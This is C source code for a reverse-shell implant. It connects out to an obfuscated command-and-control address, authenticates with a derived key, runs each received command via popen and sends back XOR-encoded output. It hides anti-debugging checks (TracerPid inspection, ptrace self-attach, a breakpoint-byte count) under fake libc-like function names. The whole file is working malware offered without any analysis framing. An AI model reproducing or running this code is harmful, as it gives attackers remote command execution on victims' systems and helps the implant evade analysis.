#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <arpa/inet.h>

#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <ctype.h>
#include <unistd.h>

#define MAX 1024
#define PORT 559043747

char *dec(char *);
char *enc(char *);
void reader(int);

// Antidebug functions, false name becouse of symbols 
int _memset();
int _sprintf();
int _strncpy();

int hash(char *);

extern unsigned char *_start;
extern unsigned char *__etext;

char encbuff[MAX];
char decbuff[MAX];
char access_key[MAX];

int initial_brk;
int actual_brk;

int key_part;


// check /proce/self/status for TracerPid
int _strncpy()
{
    char buf[4096];
    int num_read;
    int status_fd;
    char tracerPidString[] = "TracerPid:";
    char tracer_pid_ptr[4096];
    char *characterPtr;

    status_fd  = open("/proc/self/status", O_RDONLY);
    if (status_fd == -1)
        return -1;

    num_read = read(status_fd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
        return -1;

    buf[num_read] = '\0';
    strncpy(tracer_pid_ptr, strstr(buf, tracerPidString), num_read);
    if (!tracer_pid_ptr)
        return -1;

    for (characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - 1; characterPtr <= tracer_pid_ptr + num_read; ++characterPtr) {
        if (isspace(*characterPtr)) {
            continue;
	} else {
            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
	}
    }

    return -1;
}

// fork and ptrace so we will not go easy
int _memset() {
  int pid = fork();
  int status;
  int res;

  if (pid == -1) {
      perror("fork");
      return -1;
  }

  if (pid == 0) {
      int ppid = getppid();

      if (ptrace(PTRACE_ATTACH, ppid, NULL, NULL) == 0) {
          waitpid(ppid, NULL, 0);
          ptrace(PTRACE_CONT, NULL, NULL);
          ptrace(PTRACE_DETACH, getppid(), NULL, NULL);
          res = 0;
        } else {
            res = 1;
        }
    } else {
      	waitpid(pid, &status, 0);
      	res = WEXITSTATUS(status);
    }

    if (res != 0) {
	exit(-1);
    }
    return res;
}

// count 0xcc in self (0xcc is int 3 which is software breakpoint) and return
int _sprintf()
{
    int count = 0;
    char *start = (char *)&_start;
    char *end = (char *)&__etext;

    volatile unsigned char bppart[1] = { 0x66 };

    while (start != end) {
        if (((*(volatile unsigned *)start) & 0xFF) == (*bppart) + (*bppart)) {
            count++;
        }
        ++start;
    }
    return count;
}


char *dec(char *text)
{
    int i;
    bzero(decbuff, MAX);
    for (i = 0; text[i] != 0x00; i++) {
        decbuff[i] = ((int)(text[i])^'x'^'P')+16;
    }

    return decbuff;
}

char *enc(char *text)
{
    int i;
    bzero(encbuff, MAX);
    for (i = 0; text[i] != 0x00; i++) {
        encbuff[i] = ((int)(text[i])-16)^'P'^'x';
    }

    return encbuff;
}

int hash(char *input) {
    int result = 0x55555555;

    while (*input) {
        result ^= *input++;
    	result *= 0x5bd1e995;
    	result ^= result >> 15;
    }
    return result;
}

void reader(int sockfd)
{
    FILE *fp;
    char buff[MAX];
    char output[1024];
    int n;
    int x;
    
    // Get actual number of breakpoints
    actual_brk = _sprintf();
    // Create key for CNC auth
    sprintf(access_key, "%d_G_%d", key_part, actual_brk);
    write(sockfd, enc(access_key), MAX);

    while (1) {
    	if (_strncpy() != 0)
	    exit(1);
        bzero(buff, MAX);
        read(sockfd, buff, sizeof(buff));
        if ((strncmp(dec(buff), "exit", 4)) == 0) {
            write(sockfd, enc("exit"), 4);
            break;
        }
    	_memset();
    	actual_brk = _sprintf();
	// if actual count of breakpoint is different then that on start we can assume that we are in debugger
	if (actual_brk != initial_brk)
		exit(1);
        fp = (FILE *)popen(dec(buff), "r");
        if (fp == NULL)
            continue;

        x = 0;
        while(!feof(fp) ) {
            if( fgets( buff, 128, fp ) != NULL ) {
    		_memset();
                write(sockfd, enc(buff), sizeof(buff));
            }
        }

        write(sockfd, enc("EOF"), sizeof(enc("EOF")));
        pclose(fp);
    }
}

int main()
{
    unsigned y;
    unsigned t;
    int sockfd, connfd;
    int offset = 0;
    struct sockaddr_in servaddr, cli;
    
    if (_strncpy() != 0)
	    exit(1);

    _memset();
    initial_brk = _sprintf();

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        exit(0);
    }

    bzero(&servaddr, sizeof(servaddr));

    // Obfuscated IP
    y = 67109025;

    key_part = y+initial_brk^PORT;    

    servaddr.sin_family = AF_INET;

    t = ((y & 0x11111111) << 3) | (((y & 0x11111111) << 2)
                                   ^ ((y & 0x22222222) << 1));

    servaddr.sin_addr.s_addr = t | (((t >> 2) ^ ((y >> 2) & 0x33333333)))*(initial_brk);
    servaddr.sin_port = htons(~(PORT^0xdeadbeef));


    _memset();
    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        exit(0);
    }

    reader(sockfd);
    close(sockfd);
    exit(1);
    return 0;
}
